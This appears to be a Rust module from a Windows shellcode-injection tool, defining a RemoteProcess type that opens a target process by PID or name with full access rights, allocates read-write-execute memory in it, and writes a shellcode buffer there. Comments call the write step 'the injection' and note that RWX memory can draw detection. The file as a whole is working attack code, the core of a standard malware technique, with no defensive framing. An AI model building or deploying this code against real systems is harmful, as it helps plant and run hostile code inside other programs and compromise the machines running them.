//! Provides a representation of a single target remote process,
//! while exposing simple API for manipulating this.
#![allow(dead_code)]

use crate::{
    helper::process::get_process_by_name,
    wrapper::args::ProcessArgs
};
use log::info;
use std::ffi::c_void;
use windows::Win32::{
    Foundation::{ CloseHandle, GetLastError, HANDLE },
    System::{
        Diagnostics::{
            Debug::WriteProcessMemory,
            ToolHelp::PROCESSENTRY32W
        },
        Memory::{
            VirtualAllocEx,
            MEM_COMMIT, PAGE_EXECUTE_READWRITE
        },
        Threading::{
            OpenProcess,
            PROCESS_ALL_ACCESS
        }
    }
};

// Reusable type to void pointer.
pub type RawPtr = *mut c_void;

// Representation and encapsulating logic for a remote
// target process.
#[derive(Debug)]
pub struct RemoteProcess {

    // PID or process name, whichever is specified.
    pub identifier: ProcessArgs,

    // To be populated later by struct method, comprises
    // handle to opened process.
    pub p_handle: Option<HANDLE>,

    // Destination address in which the shellcode
    // will be injected.
    pub p_target_address: Option<RawPtr>
}

impl RemoteProcess {

    pub fn new(identifier: ProcessArgs) -> Self {

        // Handle defaults to None as will be mutated later.
        RemoteProcess { identifier, p_handle: None, p_target_address: None }
    }

    pub fn create_handle(&mut self) -> Result<(), String> {
        // Creates handle to specified remote process
        // and mutates RemoteProcess struct accordingly.

        match &self.identifier {

            // PID specified in application arguments.
            ProcessArgs::PID(p_id) => {

                self.p_handle = unsafe {
                    
                    // PROCESS_ALL_ACCESS necccessary
                    // to pass process' DACL check.
                    OpenProcess(
                        PROCESS_ALL_ACCESS,
                        false,
                        *p_id
                    )

                }.ok();

                if self.p_handle.is_none() {
                    
                    return Err(String::from("Handle creation failed. Ensure the correct process is targeted."));
                }

                info!("Handle opened to PID {}", p_id);

                Ok(())
            },

            ProcessArgs::PName(p_name) => {

                if let Some(p_inst) = get_process_by_name(p_name) {

                    let RemoteProcess { identifier, .. } = &p_inst;

                    if let ProcessArgs::PID(p_id) = identifier {

                        self.p_handle = unsafe {
                    
                            // PROCESS_ALL_ACCESS necccessary
                            // to pass process' DACL check. 
                            OpenProcess(
                                PROCESS_ALL_ACCESS,
                                false,
                                *p_id
                            )
        
                        }.ok();

                        // Set PID such that thread enumeration can work
                        // on this.
                        self.identifier = ProcessArgs::PID(p_id.clone());
        
                        if self.p_handle.is_none() {
                            
                            return Err(String::from(
                                format!("Failed to create process handle: {:?}", unsafe { GetLastError() })
                            ));
                        }

                        info!("Handle opened to PID {}", p_id);

                        Ok(())

                    } else {

                        Err(String::from("Failed to find PID to attach to."))
                    }

                } else {

                    Err(String::from("Failed to find PID from process name. Please review the arguments."))
                }
            }
        }
    }

    pub fn allocate_memory(&mut self, shellcode_size: usize) -> Result<(), String> {
        // Using a given process handle, allocates space in memory map
        // and sets internal address for later use.
        // 
        // Accepts usize parameter so that virtual memory equal to that
        // of the inout shellcode is allocate.

        if let Some(p_handle) = self.p_handle {

            self.p_target_address = Some(unsafe {

                VirtualAllocEx(
                    p_handle,
                    None,
                    shellcode_size, // payload size.
                    MEM_COMMIT,
                    // RWX ; potentially problematic in terms of
                    // detection.
                    PAGE_EXECUTE_READWRITE
                )
            });

            if self.p_target_address.is_none() {

                return Err(String::from(
                    format!("Failed to allocate virtual memory: {:?}", unsafe { GetLastError() })
                ));
            }

            info!("Allocated virtual memory to process: {:?}", self.p_target_address);

            Ok(())

        } else {

            Err(String::from("Failed to retrieve handle."))
        }
    }

    pub fn write_to_memory(&self, buffer: Vec<u8>) -> Result<(), String> {
        // Using the address to which memory was previously allocated,
        // write the input shellcode to this. This is the injection.

        if let (Some(p_handle), Some(p_target_address)) = 

            // Destructure the handle and allocated address.
            (self.p_handle, self.p_target_address) {

                // Casting as `lpBuffer` is a LPCVOID. 
                let buffer_ptr: RawPtr = buffer.as_ptr() as RawPtr;

                if unsafe {

                    WriteProcessMemory(
                        p_handle,
                        p_target_address,
                        buffer_ptr,
                        buffer.len(),
                        None
                    )

                }.is_err() {

                    return Err(String::from(
                        format!("Failed to inject payload: {:?}", unsafe { GetLastError() })
                    ));
                }

                info!("Injected payload in virtual address: {:?}", self.p_target_address);

                Ok(())

        } else {

            Err(String::from("Failed to write to memory."))
        }
    }
}

// Release handle created for the target process,
// in this case the HANDLE attribute.
impl Drop for RemoteProcess {

    fn drop(&mut self) {
        
        if let Some(p_handle) = self.p_handle {

            let _ = unsafe { CloseHandle(p_handle) };
            self.p_handle = None;
        }
    }
}

// Provides interoperability between in-built
// thread structure and that custom.
impl From<PROCESSENTRY32W> for RemoteProcess {

    fn from(p_entry: PROCESSENTRY32W) -> Self {
        // Casting from PROCESSENTRY32 -> RemoteProcess.

        RemoteProcess {

            identifier: ProcessArgs::PID(p_entry.th32ProcessID),
            p_handle: None,
            p_target_address: None
        }
    }
}

pub fn attach_to_process(identifier: ProcessArgs) -> Result<RemoteProcess, String> {
    // Friendly API for instantiating remote process struct
    // and creating a handle.

    let mut remote_process = RemoteProcess::new(identifier);
    
    if let Err(err) = remote_process.create_handle() {

        Err(String::from(err))

    } else {

       Ok(remote_process)
    }
}